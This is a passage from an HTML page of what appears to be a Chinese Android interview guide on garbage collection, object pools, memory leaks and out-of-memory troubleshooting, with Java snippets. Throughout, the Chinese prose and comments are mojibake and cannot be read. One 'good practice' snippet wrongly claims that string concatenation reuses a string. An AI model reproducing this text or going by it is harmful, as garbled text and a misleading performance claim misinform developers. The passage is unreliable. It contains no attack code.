<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨å¯¹è±¡æ± </strong></p>
<ul>
<li>å¯¹äºéœ€è¦é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¯¹è±¡æ± ç®¡ç†å¯¹è±¡å¤ç”¨</li>
</ul>
<p><strong>4. å‡å°‘GC</strong></p>
<ul>
<li>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>è®©åˆ—è¡¨æ»‘åŠ¨æ›´æµç•…</li>
</ul>
<p><strong>5. å¦‚ä½•ä½¿ç”¨å¯¹è±¡æ± å‡å°‘å¯¹è±¡åˆ†é…ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¯¹è±¡æ± çš„æ ¸å¿ƒæ€æƒ³æ˜¯<strong>å¤ç”¨å¯¹è±¡</strong>ï¼Œé¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯ã€‚</p>
<p><strong>åŸç†ï¼š</strong></p>
<ol>
<li>é¢„å…ˆåˆ›å»ºä¸€äº›å¯¹è±¡ï¼Œæ”¾åœ¨æ± ä¸­</li>
<li>éœ€è¦æ—¶ä»æ± ä¸­è·å–ï¼Œä½¿ç”¨å®Œåå½’è¿˜åˆ°æ± ä¸­</li>
<li>é¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯å¯¹è±¡</li>
</ol>
<p><strong>å®ç°æ–¹å¼ï¼š</strong></p>
<p><strong>1. RecyclerViewçš„ViewHolderæ± ï¼ˆç³»ç»Ÿè‡ªå¸¦ï¼‰</strong></p>
<ul>
<li>RecyclerViewè‡ªåŠ¨ç®¡ç†ViewHolderæ± </li>
<li>å¼€å‘è€…åªéœ€è¦æ­£ç¡®å®ç°Adapter</li>
</ul>
<p><strong>2. è‡ªå®šä¹‰å¯¹è±¡æ± </strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> Queue&lt;T&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> maxSize;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectPool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
    }
    
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> {
        <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> pool.poll();
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) {
            obj = createObject();  <span class="hljs-comment">// æ± ä¸ºç©ºæ—¶åˆ›å»ºæ–°å¯¹è±¡</span>
        }
        <span class="hljs-keyword">return</span> obj;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-keyword">if</span> (pool.size() &lt; maxSize) {
            resetObject(obj);  <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€</span>
            pool.offer(obj);   <span class="hljs-comment">// å½’è¿˜åˆ°æ± ä¸­</span>
        }
    }
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¦‚åŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>åˆ›å»ºæˆæœ¬é«˜çš„å¯¹è±¡ï¼ˆå¦‚Bitmapã€å¤§å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>æé«˜æ€§èƒ½ï¼Œå‡å°‘å†…å­˜åˆ†é…å¼€é”€</li>
</ul>
<p><strong>6. å¦‚ä½•é¿å…Full GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚</p>
<p><strong>1. é¿å…å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´å¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li>æœ€ç»ˆå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œè§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>2. å‡å°‘è€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å¤šï¼Œå®¹æ˜“è§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>å‡å°‘é•¿æœŸå­˜æ´»çš„å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>é¿å…å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
</li>
</ul>
<p><strong>3. ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</strong></p>
<ul>
<li>System.gc()ä¼šå¼ºåˆ¶è§¦å‘Full GC</li>
<li>Androidä¸æ¨èä½¿ç”¨</li>
<li>åº”è¯¥è®©ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†GC</li>
</ul>
<p><strong>4. ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆLruCacheï¼‰</li>
</ul>
<p><strong>5. ç›‘æ§å’Œè°ƒä¼˜</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç›‘æ§GC</li>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œåˆ†æFull GCçš„åŸå› </li>
<li>æ ¹æ®å®é™…æƒ…å†µä¼˜åŒ–</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯èƒ½å¯¼è‡´Full GC</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// æ— é™åˆ¶ç¼“å­˜ï¼Œå†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…Full GC</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// æœ‰å¤§å°é™åˆ¶</span>
</code></pre>
<h4 data-id="heading-81">6.2.2 å†…å­˜æ³„æ¼</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>å®šä¹‰ï¼š</strong>
å†…å­˜æ³„æ¼æ˜¯æŒ‡å¯¹è±¡å·²ç»ä¸å†ä½¿ç”¨ï¼Œä½†å› ä¸ºè¢«å¼•ç”¨æ— æ³•è¢«GCå›æ”¶ï¼Œå¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨ã€‚</p>
<p><strong>ä¸å†…å­˜æº¢å‡ºçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li><strong>å†…å­˜æº¢å‡º</strong>ï¼šå†…å­˜çœŸçš„ä¸å¤Ÿç”¨äº†ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡ï¼Œç«‹å³æŠ›å‡ºOutOfMemoryError</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li>åº”ç”¨å˜æ…¢ï¼Œå¯èƒ½è¢«ç³»ç»Ÿæ€æ­»</li>
<li>é¢‘ç¹è§¦å‘Full GCï¼Œå¯¼è‡´å¡é¡¿</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryLeak</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œæ— æ³•å›æ”¶</span>
        <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«GCå›æ”¶</span>
        <span class="hljs-comment">// å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</span>
    }
}
</code></pre>
<p><strong>2. Androidä¸­å¸¸è§çš„å†…å­˜æ³„æ¼åœºæ™¯æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. Activity/Contextæ³„æ¼</strong></p>
<ul>
<li><strong>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activityï¼Œå¯¼è‡´æ³„æ¼</span>
</code></pre>
</li>
<li><strong>å•ä¾‹æŒæœ‰Contextå¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•ä¾‹æŒæœ‰Activity Contextï¼Œå¯¼è‡´æ³„æ¼</span>
<span class="hljs-keyword">private</span> Context context;  <span class="hljs-comment">// å¦‚æœæ˜¯Activity Contextï¼Œä¼šæ³„æ¼</span>
</code></pre>
</li>
<li><strong>å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
    <span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨ï¼Œå¯¼è‡´æ³„æ¼</span>
};
</code></pre>
</li>
</ul>
<p><strong>2. å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</strong></p>
<ul>
<li><strong>Handlerå†…å­˜æ³„æ¼</strong>ï¼šHandleræŒæœ‰Activityå¼•ç”¨</li>
<li><strong>åŒ¿åç±»æ³„æ¼</strong>ï¼šåŒ¿åå†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šHandlerã€Runnableã€ç›‘å¬å™¨ç­‰</li>
</ul>
<p><strong>3. ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</strong></p>
<ul>
<li><strong>EventBusæœªå–æ¶ˆæ³¨å†Œ</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
<li><strong>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œ</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
<li><strong>å…¶ä»–ç›‘å¬å™¨</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
</ul>
<p><strong>4. é›†åˆç±»æ³„æ¼</strong></p>
<ul>
<li><strong>Listã€Mapä¸­ä¿å­˜äº†ä¸å†ä½¿ç”¨çš„å¯¹è±¡</strong></li>
<li>é›†åˆæŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li>ç¤ºä¾‹ï¼šç¼“å­˜ã€é›†åˆç­‰</li>
</ul>
<p><strong>5. çº¿ç¨‹æ³„æ¼</strong></p>
<ul>
<li>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶</li>
<li>ç¤ºä¾‹ï¼šAsyncTaskã€HandlerThreadç­‰</li>
</ul>
<p><strong>6. èµ„æºæœªå…³é—­</strong></p>
<ul>
<li>æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€ç½‘ç»œè¿æ¥ç­‰æœªå…³é—­</li>
<li>å¯¼è‡´èµ„æºæ³„æ¼</li>
</ul>
<p><strong>3. å¦‚ä½•æ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆæ¨èï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šä½¿ç”¨WeakReferenceå’ŒReferenceQueueï¼Œç›‘æ§å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œä¸éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œèƒ½å¿«é€Ÿå‘ç°å†…å­˜æ³„æ¼</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šæ·»åŠ ä¾èµ–ï¼Œè¿è¡Œåº”ç”¨ï¼Œè‡ªåŠ¨æ£€æµ‹</li>
</ul>
<p><strong>2. MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šåˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šèƒ½è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šç”Ÿæˆå †è½¬å‚¨ï¼Œå¯¼å‡ºhprofæ–‡ä»¶ï¼Œç”¨MATæ‰“å¼€åˆ†æ</li>
</ul>
<p><strong>3. Android Studio Profiler</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨ï¼ŒæŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šå®æ—¶ç›‘æ§ï¼Œæ–¹ä¾¿æŸ¥çœ‹å†…å­˜å˜åŒ–</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šæ‰“å¼€Profilerçª—å£ï¼ŒæŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p><strong>æ£€æµ‹æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆå¼€å‘é˜¶æ®µï¼‰
<span class="hljs-bullet">2.</span> å¦‚æœå‘ç°æ³„æ¼ï¼Œä½¿ç”¨MATåˆ†æå †è½¬å‚¨
<span class="hljs-bullet">3.</span> æ‰¾å‡ºæ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾
<span class="hljs-bullet">4.</span> ä¿®å¤ä»£ç 
</code></pre>
<p><strong>4. å¦‚ä½•é¿å…å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸ</strong></p>
<ul>
<li>åœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
    handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);
    cache.clear();
}
</code></pre>
<p><strong>2. åŠæ—¶å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</strong></p>
<ul>
<li>æ³¨å†Œçš„ç›‘å¬å™¨è¦åœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</li>
<li>ç¤ºä¾‹ï¼šEventBusã€å¹¿æ’­æ¥æ”¶å™¨ç­‰</li>
</ul>
<p><strong>3. ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</strong></p>
<ul>
<li>å¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</li>
<li>ç¤ºä¾‹ï¼šHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<p><strong>4. é¿å…å¾ªç¯å¼•ç”¨</strong></p>
<ul>
<li>æ³¨æ„å¯¹è±¡ä¹‹é—´çš„ç›¸äº’å¼•ç”¨</li>
<li>åŠæ—¶æ–­å¼€ä¸éœ€è¦çš„å¼•ç”¨</li>
</ul>
<p><strong>5. åˆç†ä½¿ç”¨ç¼“å­˜</strong></p>
<ul>
<li>ä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜ï¼ˆLruCacheï¼‰</li>
<li>åŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
</code></pre>
<h4 data-id="heading-82">6.2.3 å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>å®šä¹‰ï¼š</strong>
å†…å­˜æº¢å‡ºï¼ˆOutOfMemoryErrorï¼ŒOOMï¼‰æ˜¯æŒ‡åº”ç”¨éœ€è¦çš„å†…å­˜è¶…è¿‡äº†ç³»ç»Ÿåˆ†é…çš„é™åˆ¶ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡ã€‚</p>
<p><strong>Androidå †å†…å­˜æº¢å‡ºï¼š</strong></p>
<ul>
<li>æœ€å¸¸è§çš„æ˜¯å †å†…å­˜æº¢å‡ºï¼ˆOutOfMemoryError: Java heap spaceï¼‰</li>
<li>å †å†…å­˜ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>åº”ç”¨å´©æºƒï¼Œç”¨æˆ·ä½“éªŒå·®</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OOMExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createTooManyObjects</span><span class="hljs-params">()</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// æœ€ç»ˆå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<p><strong>2. Androidå †å†…å­˜æº¢å‡ºå¦‚ä½•è§£å†³ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. æ’æŸ¥å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼æ˜¯å¯¼è‡´OOMçš„ä¸»è¦åŸå› </li>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºæ³„æ¼å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼é—®é¢˜</li>
</ul>
<p><strong>2. å‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¤§é‡å¯¹è±¡</li>
</ul>
<p><strong>3. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>é¿å…åŠ è½½è¿‡å¤§çš„å›¾ç‰‡</li>
</ul>
<p><strong>4. åŠæ—¶é‡Šæ”¾èµ„æº</strong></p>
<ul>
<li>åœ¨onDestroyä¸­é‡Šæ”¾èµ„æº</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
<li>æ¸…ç†ç¼“å­˜</li>
</ul>
<p><strong>5. åˆ†æ‰¹åŠ è½½æ•°æ®</strong></p>
<ul>
<li>ä¸è¦ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
<li>åˆ†æ‰¹åŠ è½½ï¼Œå‡å°‘å†…å­˜å‹åŠ›</li>
</ul>
<p><strong>6. å¢åŠ å†…å­˜é™åˆ¶ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰</strong></p>
<ul>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"</li>
<li>ä½†è¿™ä¸æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼Œè¿˜æ˜¯è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<p><strong>è§£å†³æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ç”Ÿæˆå †è½¬å‚¨ï¼ˆOOMæ—¶è‡ªåŠ¨ç”Ÿæˆæˆ–æ‰‹åŠ¨ç”Ÿæˆï¼‰
<span class="hljs-bullet">2.</span> ä½¿ç”¨MATåˆ†æå †è½¬å‚¨
<span class="hljs-bullet">3.</span> æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡
<span class="hljs-bullet">4.</span> åˆ†æä¸ºä»€ä¹ˆè¿™äº›å¯¹è±¡æ— æ³•å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰
<span class="hljs-bullet">5.</span> ä¿®å¤é—®é¢˜ï¼ˆä¿®å¤å†…å­˜æ³„æ¼ã€ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼‰
</code></pre>
<p><strong>3. å¦‚ä½•æ’æŸ¥å†…å­˜æº¢å‡ºé—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨OOMæ—¶è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨Android Studio Profileræ‰‹åŠ¨ç”Ÿæˆ</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>2. ä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾</li>
</ul>
<p><strong>3. æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åˆ†æè¿™äº›å¯¹è±¡ä¸ºä»€ä¹ˆå ç”¨è¿™ä¹ˆå¤šå†…å­˜</li>
</ul>
<p><strong>4. åˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰</li>
</ul>
<p><strong>5. ä¿®å¤é—®é¢˜</strong></p>
<ul>
<li>å¦‚æœæ˜¯å†…å­˜æ³„æ¼ï¼Œä¿®å¤æ³„æ¼</li>
<li>å¦‚æœæ˜¯å¤§å¯¹è±¡ï¼Œä¼˜åŒ–å¤§å¯¹è±¡</li>
<li>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤šï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>å¸¸è§åŸå› ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
